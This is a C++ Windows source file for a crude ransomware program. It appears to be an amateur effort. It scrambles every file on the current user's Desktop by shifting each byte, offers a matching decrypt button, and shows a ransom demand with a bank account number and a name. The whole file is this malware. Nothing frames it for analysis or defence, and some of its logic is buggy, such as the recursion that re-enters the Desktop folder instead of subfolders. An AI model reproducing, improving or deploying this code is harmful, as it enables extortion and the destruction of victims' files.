#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include "dirent.h"
#include <sys/types.h>
#include <Lmcons.h>
#define FILE_MENU_NEW 1
#define ENC_BUTTON 123
#define DEC_BUTTON 124
using namespace std;

void encFile(string filePath) {
    cout << "Encrypting :)" << endl;
    fstream file, tmpFile;
    string tmpFilePath = "tmp.txt";
    file.open(filePath, ios::in);
    tmpFile.open(tmpFilePath, ios::out);
    char byte;
    while (file >> noskipws >> byte) {
        byte += 100;
        tmpFile << byte;
    }

    file.close();
    tmpFile.close();

    file.open(filePath, ios::out);
    tmpFile.open(tmpFilePath, ios::in);

    while (tmpFile >> noskipws >> byte) {
        file << byte;
    }

    file.close();
    tmpFile.close();
    (tmpFilePath.c_str());
}

void encDir() {
    DIR* dir;
    struct dirent* entry;
    struct stat status;
    string path;

    char fileName[MAX_PATH];
    char username[UNLEN + 1];
    DWORD length = UNLEN + 1;
    GetUserName(username, &length);

    string first = "C:\\Users\\";
    string second = "\\Desktop\\";
    string dirPath = first + username + second;
    cout << "Username: " << username << endl;
    cout << "Path: " << dirPath << endl;

    if ((dir = opendir(dirPath.c_str())) != NULL) {
        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                path = dirPath + "\\" + entry->d_name;
                stat(path.c_str(), &status);
                if (S_ISDIR(status.st_mode)) {
                    encDir();
                }
                else {
                    encFile(path);
                }
            }
        }
    }
}

void decFile(string filePath) {
    cout << "Decrypting:)" << endl;
    fstream file, tmpFile;
    string tmpFilePath = "tmp.txt";
    file.open(filePath, ios::in);
    tmpFile.open(tmpFilePath, ios::out);
    char byte;
    while (file >> noskipws >> byte) {
        byte -= 100;
        tmpFile << byte;
    }

    file.close();
    tmpFile.close();

    file.open(filePath, ios::out);
    tmpFile.open(tmpFilePath, ios::in);

    while (tmpFile >> noskipws >> byte) {
        file << byte;
    }

    file.close();
    tmpFile.close();
    (tmpFilePath.c_str());
}

void decDir() {
    DIR* dir;
    struct dirent* entry;
    struct stat status;
    string path;

    char fileName[MAX_PATH];
    char username[UNLEN + 1];
    DWORD length = UNLEN + 1;
    GetUserName(username, &length);

    string first = "C:\\Users\\";
    string second = "\\Desktop\\";
    string dirPath = first + username + second;
    cout << "Username: " << username << endl;
    cout << "Path: " << dirPath << endl;

    if ((dir = opendir(dirPath.c_str())) != NULL) {
        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                path = dirPath + "\\" + entry->d_name;
                stat(path.c_str(), &status);
                if (S_ISDIR(status.st_mode)) {
                    decDir();
                }
                else {
                    decFile(path);
                }
            }
        }
    }
}

LRESULT CALLBACK WindowProcedure(HWND, UINT, WPARAM, LPARAM);
void button(HWND);
HMENU hMenu;


LRESULT CALLBACK WindowProcedure(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp)
{
    switch (msg)
    {
    case WM_COMMAND:
        switch (wp)
        {
        case ENC_BUTTON:
            encDir();
            break;
        case DEC_BUTTON:
            decDir();
            break;
        }
        break;
    case WM_CREATE:
        button(hWnd);
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProcW(hWnd, msg, wp, lp);
    }
}

int WINAPI main(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR args, int ncmdshow)
{
    WNDCLASSW wc = { 0 };
    wc.hbrBackground = (HBRUSH)COLOR_WINDOW;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hInstance = hInst;
    wc.lpszClassName = L"workPlease";
    wc.lpfnWndProc = WindowProcedure;

    if (!RegisterClassW(&wc))
        return -1;

    CreateWindowW(L"workPlease", L"btw im e-girl", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 100, 100, 300, 300,
        NULL, NULL, NULL, NULL);

    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, NULL, NULL))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}

void button(HWND hWnd)
{
    CreateWindowW(
        L"static",L"you're hacked bro, make payment pls im starving 5002846394 Khasbank - Uuganbayar",WS_VISIBLE | WS_CHILD | WS_BORDER | SS_CENTER, 40,150,220,70,hWnd, NULL, NULL, NULL);
    CreateWindowW(
        L"BUTTON", L"Encrypt", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 10, 40, 130, 100, hWnd, (HMENU)ENC_BUTTON,
        (HINSTANCE)GetWindowLongPtr(hWnd, GWLP_HINSTANCE), NULL);
    CreateWindowW(
        L"BUTTON", L"Decrypt", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 150, 40, 130, 100, hWnd, (HMENU)DEC_BUTTON,
        (HINSTANCE)GetWindowLongPtr(hWnd, GWLP_HINSTANCE), NULL);
}


// asdf
